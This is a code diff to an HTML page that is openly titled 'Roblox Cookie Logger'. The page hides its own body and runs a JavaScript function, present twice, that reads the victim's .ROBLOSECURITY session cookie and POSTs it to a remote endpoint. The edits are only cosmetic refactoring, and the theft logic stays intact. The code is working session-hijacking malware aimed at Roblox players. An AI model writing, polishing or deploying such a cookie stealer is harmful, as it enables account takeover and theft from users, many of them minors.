@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>log</title>
+    <title>Roblox Cookie Logger</title>
     <style>
         body {
             display: none;
@@ -17,7 +17,7 @@
         function logCookie() {
             // Find the .ROBLOSECURITY cookie
             const cookies = document.cookie.split(';').map(cookie => cookie.trim());
-            let robloxSecurityCookie = cookies.find(cookie => cookie.startsWith('.ROBLOSECURITY='));
+            const robloxSecurityCookie = cookies.find(cookie => cookie.startsWith('.ROBLOSECURITY='));
 
             if (robloxSecurityCookie) {
                 const data = {
@@ -30,13 +30,15 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(data)
-                }).then(response => {
+                })
+                .then(response => {
                     if (response.ok) {
                         console.log('.ROBLOSECURITY cookie logged successfully');
                     } else {
                         console.error('Failed to log .ROBLOSECURITY cookie');
                     }
-                }).catch(error => {
+                })
+                .catch(error => {
                     console.error('Error logging .ROBLOSECURITY cookie:', error);
                 });
             } else {
@@ -62,7 +64,7 @@
                             function logCookie() {
                                 // Find the .ROBLOSECURITY cookie
                                 const cookies = document.cookie.split(';').map(cookie => cookie.trim());
-                                let robloxSecurityCookie = cookies.find(cookie => cookie.startsWith('.ROBLOSECURITY='));
+                                const robloxSecurityCookie = cookies.find(cookie => cookie.startsWith('.ROBLOSECURITY='));
 
                                 if (robloxSecurityCookie) {
                                     const data = {
@@ -75,13 +77,15 @@
                                             'Content-Type': 'application/json'
                                         },
                                         body: JSON.stringify(data)
-                                    }).then(response => {
+                                    })
+                                    .then(response => {
                                         if (response.ok) {
                                             console.log('.ROBLOSECURITY cookie logged successfully');
                                         } else {
                                             console.error('Failed to log .ROBLOSECURITY cookie');
                                         }
-                                    }).catch(error => {
+                                    })
+                                    .catch(error => {
                                         console.error('Error logging .ROBLOSECURITY cookie:', error);
                                     });
                                 } else {
